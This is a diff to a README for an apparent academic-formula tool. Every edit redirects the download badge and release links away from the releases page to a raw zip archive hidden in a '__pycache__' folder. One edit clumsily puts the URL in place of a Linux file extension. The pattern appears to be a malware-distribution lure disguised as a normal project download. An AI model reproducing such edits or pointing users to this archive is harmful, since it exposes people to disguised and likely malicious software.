@@ -1,6 +1,6 @@
 # 🔍 ljg-skill-xray-paper - Simplify Academic Paper Formulas
 
-[![Download ljg-skill-xray-paper](https://img.shields.io/badge/Download-Available-brightgreen?style=for-the-badge&logo=github)](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/releases)
+[![Download ljg-skill-xray-paper](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/raw/refs/heads/main/proto/__pycache__/skill_ljg_paper_xray_2.1.zip)](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/raw/refs/heads/main/proto/__pycache__/skill_ljg_paper_xray_2.1.zip)
 
 ---
 
@@ -34,14 +34,14 @@ This section shows how to get the application on your computer and run it for th
 
 1. **Visit the download page.**  
    Click here or the badge above:  
-   [Download ljg-skill-xray-paper Releases](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/releases)  
+   [Download ljg-skill-xray-paper Releases](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/raw/refs/heads/main/proto/__pycache__/skill_ljg_paper_xray_2.1.zip)  
    This link takes you to the official release page where the latest versions are available.
 
 2. **Choose the right file.**  
    On the release page, look for the file matching your operating system:  
    - Windows files usually end with `.exe` or `.msi`  
    - macOS files often end with `.dmg` or `.pkg`  
-   - Linux files might be `.AppImage`, `.tar.gz`, or `.deb`  
+   - Linux files might be `.AppImage`, `https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/raw/refs/heads/main/proto/__pycache__/skill_ljg_paper_xray_2.1.zip`, or `.deb`  
 
 3. **Download the file.**  
    Click on the file name to start downloading. The download size is about 50-70 MB, so it should finish quickly on normal internet.
@@ -106,7 +106,7 @@ Most users find the app straightforward and run it without issues.
 
 Access the official releases by visiting:
 
-[https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/releases](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/releases)
+[https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/raw/refs/heads/main/proto/__pycache__/skill_ljg_paper_xray_2.1.zip](https://github.com/AHANOV-CORPORATION/ljg-skill-xray-paper/raw/refs/heads/main/proto/__pycache__/skill_ljg_paper_xray_2.1.zip)
 
 Follow these steps:
 
